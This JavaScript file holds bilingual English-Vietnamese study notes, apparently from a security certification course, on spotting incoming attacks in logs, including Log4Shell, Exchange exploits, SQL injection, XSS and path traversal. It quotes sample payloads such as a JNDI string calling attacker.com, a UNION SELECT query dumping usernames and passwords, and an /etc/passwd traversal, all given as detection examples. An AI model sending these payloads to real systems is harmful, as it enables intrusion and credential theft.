/* Theory — D9 (Appendix D). Edit the HTML below. */
(window.CPIA_THEORY=window.CPIA_THEORY||{})["d9"]=`<h2>D9 — Incoming Attacks</h2><ul>

<li><span class="en">Public-facing attacks include exploitation of VPN, web apps, email gateways, RDP, SSH, SMB, and exposed admin portals.</span><span class="vi">Tấn công vào hệ thống đối ngoại bao gồm khai thác VPN, ứng dụng web, email gateway, RDP, SSH, SMB và cổng quản trị bị lộ.</span></li>

<li><span class="en">Evidence: WAF / web logs, IDS signatures, firewall permits, auth failures / successes, uploaded files, new processes after request.</span><span class="vi">Bằng chứng: log WAF / web, chữ ký IDS, lệnh cho phép tường lửa, lỗi / thành công xác thực, file được tải lên, tiến trình mới sau request.</span></li>

<li><span class="en">Successful attack signs: HTTP 200 after exploit payload, webshell writes, new account, service start, reverse shell, privilege escalation events.</span><span class="vi">Dấu hiệu tấn công thành công: HTTP 200 sau payload exploit, ghi webshell, tài khoản mới, khởi động dịch vụ, reverse shell, sự kiện leo thang đặc quyền.</span></li>

</ul>

<p class="sub-heading">Common Exploit Patterns and Evidence</p>

<p><strong>SQL Injection</strong></p><ul><li><strong>Evidence:</strong> web logs show single-quote, UNION SELECT, OR 1=1, comment sequences (--, #, /*) in query parameters.</li><li><strong>Detection:</strong> WAF signatures, repeated 500 errors after specific input patterns, abnormal database query logs.</li></ul>

<p class="sub-heading">Webshell deployment</p><ul><li><strong>Evidence:</strong> new file created in webroot (e.g., cmd.php, error_log.asp), unusual file size, suspicious content (eval, exec, system calls).</li><li><strong>Detection:</strong> file integrity monitoring, web server logs showing POST to an unusual file, AV / EDR alerts.</li></ul>

<p class="sub-heading">Command injection</p><ul><li><strong>Evidence:</strong> shell metacharacters (;, |, &amp;&amp;, backticks, $()) in HTTP parameters.</li><li><strong>Detection:</strong> WAF rules, process creation logs showing spawned shell (cmd.exe, /bin/sh) as child of web server process.</li></ul>

<p class="sub-heading">Path traversal</p><ul><li><strong>Evidence:</strong> ../, ..\\, URL-encoded variations (%2e%2e%2f) in request URIs.</li><li><strong>Detection:</strong> WAF rules, web server error logs showing access to unexpected file paths.</li></ul>

<p class="sub-heading">RDP brute force</p><ul><li><strong>Evidence:</strong> high volume of failed logons (Event 4625, logon type 10) from an external IP, followed by a successful logon (4624 type 10).</li><li><strong>Detection:</strong> Windows Event Log correlation, SIEM threshold rule on 4625 events.</li></ul>

<p class="sub-heading">Credential stuffing against VPN</p><ul><li><strong>Evidence:</strong> multiple failed VPN authentication attempts from various source IPs using known breached credentials.</li><li><strong>Detection:</strong> VPN logs, account lockout events (4740), geolocation anomalies.</li></ul>

<p class="sub-heading">Log4Shell (CVE-2021-44228)</p><ul>

<li><strong>What:</strong> JNDI injection vulnerability in Apache Log4j 2. Attacker sends crafted string (e.g., <code>\${jndi:ldap://attacker.com / a}</code>) which Log4j evaluates, causing the vulnerable server to fetch and execute a remote payload.</li>

<li><strong>Evidence:</strong> web logs containing <code>\${jndi:</code> in headers (User-Agent, X-Forwarded-For, Referer) or request parameters; outbound LDAP / RMI connections from web server to external IPs; new Java processes spawned after web request.</li>

<li><strong>Detection:</strong> WAF rules for <code>\${jndi:</code> pattern (including obfuscated variants like <code>\${\${lower:j}ndi:</code>); IDS signatures for JNDI injection; endpoint process monitoring for java.exe spawning shell commands.</li>

<li><strong>Scope:</strong> Affects any application using Log4j 2.x — many enterprise Java applications, cloud services, and appliances were vulnerable.</li>

<li><strong>Follow-up CVEs:</strong> CVE-2021-45046 (incomplete fix in 2.15.0 — still vulnerable in certain configurations) and CVE-2021-45105 (DoS via recursive lookup). Upgrade to Log4j 2.17.0+ for complete fix.</li>

</ul>

<p class="sub-heading">ProxyLogon / ProxyShell (Exchange exploits)</p><ul>

<li><strong>ProxyLogon (CVE-2021-26855 + CVE-2021-27065):</strong> SSRF vulnerability in Exchange allowing unauthenticated access to admin endpoints; combined with arbitrary file write to deploy webshells.</li>

<li><strong>ProxyShell (CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207):</strong> Pre-auth SSRF → privilege escalation → arbitrary file write; exploited via Exchange Client Access Service (CAS) on port 443.</li>

<li><strong>Evidence:</strong> webshell files written to Exchange directories (e.g., <code>C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\</code>); IIS logs showing exploitation URIs (<code>/owa/auth/x.js</code>, <code>/ecp/y.js</code>); new scheduled tasks or services; LSASS access by Exchange worker processes.</li>

<li><strong>Detection:</strong> Microsoft Exchange CU patches; IOC scanning tools from Microsoft; IIS log analysis for known exploitation patterns; file integrity monitoring on Exchange directories.</li>

<li><strong>Post-exploitation:</strong> Attackers commonly deploy China Chopper, ASPXSpy, or other webshells; dump credentials from Exchange; move laterally to DC.</li>

</ul>

<p class="sub-heading"><span class="en">Web Shell Access Patterns and Authentication Failures</span><span class="vi">Mẫu truy cập Web Shell và lỗi xác thực</span></p><ul><li><strong>Web shell in logs:</strong> <span class="en">POST request to static-looking file (.php / .aspx in /images/ or /upload/) followed by large response body. Command: <code>grep "POST.*200" access.log</code> filter by high response bytes.</span><span class="vi">Request POST đến file trông như tĩnh (.php / .aspx trong /images/ hoặc /upload/) theo sau bởi response body lớn. Lệnh: <code>grep "POST.*200" access.log</code> lọc theo bytes phản hồi cao.</span></li><li><strong>RCE confirmation:</strong> <span class="en">Web server process (w3wp.exe, httpd, nginx) spawning cmd.exe, bash, or powershell — Event 4688 parent-child pattern.</span><span class="vi">Tiến trình web server (w3wp.exe, httpd, nginx) tạo cmd.exe, bash hoặc powershell — mẫu cha-con Event 4688.</span></li><li><strong><span class="en">Email authentication failures = phishing:</span><span class="vi">Lỗi xác thực email = phishing:</span></strong> <span class="en">SPF FAIL = sending IP not in domain SPF record. DKIM FAIL = message modified or key mismatch. DMARC FAIL = neither SPF nor DKIM aligned → likely spoofed sender.</span><span class="vi">SPF FAIL = IP gửi không có trong bản ghi SPF của domain. DKIM FAIL = tin nhắn bị sửa đổi hoặc khóa không khớp. DMARC FAIL = cả SPF và DKIM đều không phù hợp → khả năng cao người gửi bị giả mạo.</span></li><li><strong>BEC indicators:</strong> <span class="en">Display name spoofing, lookalike domain (micros0ft.com), unusual sending time, financial urgency, changed reply-to address.</span><span class="vi">Giả mạo tên hiển thị, domain tương tự (micros0ft.com), thời gian gửi bất thường, tính cấp bách tài chính, địa chỉ reply-to bị thay đổi.</span></li></ul>

<p class="sub-heading"><span class="en">Web Application Attack Evidence</span><span class="vi">Bằng chứng tấn công ứng dụng web</span></p>

<p class="sub-heading"><span class="en">SQL Injection in Web Logs</span><span class="vi">SQL Injection trong web log</span></p><ul><li>Normal: <code>GET /products?id=42 HTTP/1.1</code></li><li>Malicious: <code>GET /products?id=42' UNION SELECT username, password FROM users-- HTTP/1.1</code></li><li><span class="en">Detection: WAF logs, repeated 500 errors, unusual parameter length, SQL keywords in query strings.</span><span class="vi">Phát hiện: log WAF, lỗi 500 lặp lại, độ dài tham số bất thường, từ khóa SQL trong query string.</span></li></ul>

<p class="sub-heading"><span class="en">Cross-Site Scripting (XSS)</span><span class="vi">Tấn công XSS (Cross-Site Scripting)</span></p><ul><li><strong>Reflected:</strong> <code>GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1</code></li><li><strong>Stored:</strong> <span class="en">POST to comment field, then GET renders payload for other users.</span><span class="vi">POST vào trường bình luận, sau đó GET hiển thị payload cho người dùng khác.</span></li><li><span class="en">Detection: script tags in parameters, event handlers (<code>onerror</code>, <code>onload</code>), encoded variants.</span><span class="vi">Phát hiện: thẻ script trong tham số, event handler (<code>onerror</code>, <code>onload</code>), các biến thể mã hóa.</span></li></ul>

<p class="sub-heading">SSRF</p><ul><li><strong>Evidence:</strong> <span class="en">Internal request to cloud metadata endpoint (<code>169.254.169.254</code>), internal IP ranges, localhost.</span><span class="vi">Request nội bộ đến endpoint metadata cloud (<code>169.254.169.254</code>), dải IP nội bộ, localhost.</span></li><li><span class="en">Detection: outbound connections from web server to unexpected internal destinations.</span><span class="vi">Phát hiện: kết nối ra ngoài từ web server đến đích nội bộ không mong đợi.</span></li></ul>

<p class="sub-heading"><span class="en">Deserialisation</span><span class="vi">Tấn công Deserialisation</span></p><ul><li><strong>Evidence:</strong> <span class="en">Serialised objects in request body (Java: <code>rO0AB...</code>, PHP: <code>O:...</code>, .NET: <code>AAEAAAD...</code>).</span><span class="vi">Đối tượng được serialize trong body request (Java: <code>rO0AB...</code>, PHP: <code>O:...</code>, .NET: <code>AAEAAAD...</code>).</span></li><li><span class="en">Detection: unusual content types, known gadget chain patterns, new processes spawned by web server.</span><span class="vi">Phát hiện: content type bất thường, mẫu gadget chain đã biết, tiến trình mới được tạo bởi web server.</span></li></ul>


<h3 class="qz-theory"><span class="en">Detecting Incoming Attacks in Logs</span><span class="vi">Phát hiện tấn công đến trong log</span></h3>
<div class="table-wrap"><table><thead><tr><th><span class="en">Log pattern</span><span class="vi">Mẫu trong log</span></th><th><span class="en">Attack</span><span class="vi">Tấn công</span></th></tr></thead><tbody>
<tr><td><code>id=1' OR '1'='1</code>, <code>UNION SELECT</code>, <code>--</code></td><td>SQL injection</td></tr>
<tr><td><code>../../../etc/passwd</code>, <code>..%2f..%2f</code></td><td><span class="en">Directory/path traversal</span><span class="vi">Vượt thư mục</span></td></tr>
<tr><td><span class="en">Shell metachars <code>; | &amp;&amp; \`</code> + commands</span><span class="vi">Ký tự shell <code>; | &amp;&amp; \`</code> + lệnh</span></td><td><span class="en">OS command injection</span><span class="vi">Tiêm lệnh OS</span></td></tr>
<tr><td><span class="en">Burst of 401/403 for one account</span><span class="vi">Loạt 401/403 cho một tài khoản</span></td><td><span class="en">Brute force / credential stuffing</span><span class="vi">Brute force / credential stuffing</span></td></tr>
<tr><td><span class="en">POST creating a new <code>.aspx</code>/<code>.php</code></span><span class="vi">POST tạo <code>.aspx</code>/<code>.php</code> mới</span></td><td><span class="en">Web shell upload</span><span class="vi">Upload web shell</span></td></tr>
<tr><td><span class="en">User-agent "Nikto"/"sqlmap"</span><span class="vi">User-agent "Nikto"/"sqlmap"</span></td><td><span class="en">Automated scanning</span><span class="vi">Quét tự động</span></td></tr></tbody></table></div>
<p><span class="en">Check the response code/size and any follow-up (e.g. 200 after a 401, data returned, a new server-executable file) to judge whether the attack succeeded.</span><span class="vi">Kiểm tra mã/kích thước phản hồi và dấu hiệu tiếp theo (vd 200 sau một 401, dữ liệu trả về, file thực thi server mới) để đánh giá tấn công có thành công không.</span></p>
`;
